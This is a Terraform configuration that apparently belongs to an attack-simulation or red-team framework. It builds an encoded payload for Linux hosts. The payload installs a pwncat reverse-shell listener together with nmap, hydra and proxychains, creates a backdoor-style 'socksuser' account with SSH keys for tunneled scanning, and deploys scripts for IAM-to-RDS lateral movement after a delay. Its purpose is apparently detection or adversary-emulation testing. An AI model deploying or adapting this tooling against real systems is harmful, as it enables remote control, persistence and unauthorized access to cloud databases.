locals {
    listen_port = var.inputs["listen_port"]
    listen_ip = var.inputs["listen_ip"]
    attack_dir = "/pwncat"
    attack_script = "pwncat.sh"
    start_script = "delayed_start.sh"
    lock_file = "/tmp/delay_pwncat.lock"
    base64_command_payload = base64encode(var.inputs["payload"])
    payload = <<-EOT
    if [ -e "/tmp/pwncat_session.lock" ]  && screen -ls | grep -q "pwncat"; then
        log "Pwncat session lock /tmp/pwncat_session.lock exists and pwncat screen session running. Skipping setup."
    else
        rm -f "/tmp/pwncat_session.lock"
        log "Session lock doesn't exist and screen session not runing. Continuing..."
        log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
        screen -S pwncat -X quit
        log "cleaning app directory"
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
        cd ${local.attack_dir}
        echo ${local.pwncat} | base64 -d > ${local.attack_script}
        echo ${local.delayed_start} | base64 -d > ${local.start_script}
        echo ${local.listener} | base64 -d > listener.py
        echo ${local.responder} | base64 -d > plugins/responder.py
        echo ${local.instance2rds} | base64 -d > resources/instance2rds.sh
        echo ${local.iam2rds} | base64 -d > resources/iam2rds.sh
        log "installing required python3.9..."
        apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
        python3.9 get-pip.py >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 jc >> $LOGFILE 2>&1
        python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        if ! ls /home/socksuser/.ssh/socksuser_key > /dev/null; then
            log "adding tunneled port scanning user - socksuser..."
            adduser socksuser >> $LOGFILE 2>&1
            log "adding ssh keys for socks user..."
            sudo -H -u socksuser /bin/bash -c "mkdir -p /home/socksuser/.ssh" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "ssh-keygen -t rsa -b 4096 -f /home/socksuser/.ssh/socksuser_key" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "cat ~/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "chmod 600 /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
            log "socksuser setup complete..."
        fi
        log "starting background delayed script start..."
        /bin/bash ${local.start_script}
        log "done."
    fi
    log "done."
    EOT
    
    pwncat          = base64encode(templatefile(
                                "${path.module}/resources/pwncat.sh",
                                {
                                    listen_port = local.listen_port
                                }
                            ))

    delayed_start   = base64encode(templatefile(
                                "${path.module}/resources/${local.start_script}",
                                {
                                    lock_file = local.lock_file
                                    attack_delay = var.inputs["attack_delay"]
                                    attack_dir = local.attack_dir
                                    attack_script = local.attack_script
                                }
                        ))

    listener        = base64encode(file(
                                "${path.module}/resources/listener.py", 
                            ))
    responder       = base64encode(templatefile(
                                "${path.module}/resources/responder.py", 
                                {
                                    default_payload = var.inputs["payload"],
                                    iam2rds_role_name = var.inputs["iam2rds_role_name"]
                                    iam2rds_session_name = "${var.inputs["iam2rds_session_name"]}-${var.inputs["deployment"]}"
                                }
                            ))
    instance2rds    = base64encode(templatefile(
                                "${path.module}/resources/instance2rds.sh", 
                                {
                                    region = var.inputs["region"],
                                    environment = var.inputs["environment"],
                                    deployment = var.inputs["deployment"]
                                }
                            ))

    iam2rds         = base64encode(templatefile(
                                "${path.module}/resources/iam2rds.sh", 
                                {
                                    region = var.inputs["region"],
                                    environment = var.inputs["environment"],
                                    deployment = var.inputs["deployment"],
                                    iam2rds_role_name = var.inputs["iam2rds_role_name"]
                                    iam2rds_session_name = "${var.inputs["iam2rds_session_name"]}-${var.inputs["deployment"]}"
                                }
                            ))
    base64_payload = base64gzip(templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = "proxychains4 nmap hydra python3-pip"
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        if ! command -v proxychains4 > /dev/null || ! command -v hydra > /dev/null || ! command -v hydra > /dev/null; then
            yum update -y
            yum install -y git
            yum groupinstall -y 'Development Tools'
            # proxychains4
            cd /usr/local/src
            git clone https://github.com/rofl0r/proxychains-ng
            cd proxychains-ng
            ./configure && make && make install
            make install-config
            # hydra
            cd /usr/local/src
            git clone https://github.com/vanhauser-thc/thc-hydra
            cd thc-hydra
            ./configure && make && make install
        fi
        EOT
        yum_packages = "nmap python3-pip"
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }}))

    outputs = {
        base64_payload = local.base64_payload
    }
}